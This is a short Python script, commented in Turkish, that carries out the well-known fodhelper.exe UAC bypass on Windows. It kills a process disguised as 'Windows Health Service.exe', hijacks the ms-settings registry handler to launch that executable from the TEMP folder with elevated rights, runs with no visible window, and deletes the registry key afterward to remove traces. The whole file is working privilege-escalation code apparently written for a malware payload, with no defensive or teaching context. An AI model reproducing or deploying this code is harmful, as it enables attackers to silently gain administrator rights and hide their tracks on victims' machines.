import os
import winreg
import subprocess
import time
import sys

def kill_process(process_name):
    """Çalışan eski süreci kapatır."""
    try:
        # /F zorla kapatır, /IM isim ile kapatır, /T alt süreçleri de kapatır
        subprocess.run(
            f'taskkill /F /IM "{process_name}" /T', 
            shell=True, 
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        # Kapanması için kısa bir süre bekle
        time.sleep(2)
    except:
        pass

def bypass_uac_and_run(exe_path):
    target_name = "Windows Health Service.exe"
    
    # 1. ADIM: Eski olanı kapat
    kill_process(target_name)

    reg_path = r'Software\Classes\ms-settings\shell\open\command'
    temp_folder = os.environ.get('TEMP')
    full_path = os.path.join(temp_folder, target_name)

    # Dosya kontrolü
    if not os.path.exists(full_path):
        return

    try:
        # 2. ADIM: Kayıt defteri işlemleri (Bypass için)
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
            # Boşluklu yollar için çift tırnak önemli
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, f'"{full_path}"')
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        # 3. ADIM: Yeni kopyayı tetikle
        subprocess.run(
            "fodhelper.exe", 
            shell=True, 
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Kayıt defterinin okunması için bekle
        time.sleep(5)

        # 4. ADIM: İzleri temizle
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)

    except:
        pass

if __name__ == "__main__":
    # Ekrana hiçbir çıktı vermez ve her şeyi arka planda yapar
    bypass_uac_and_run("")
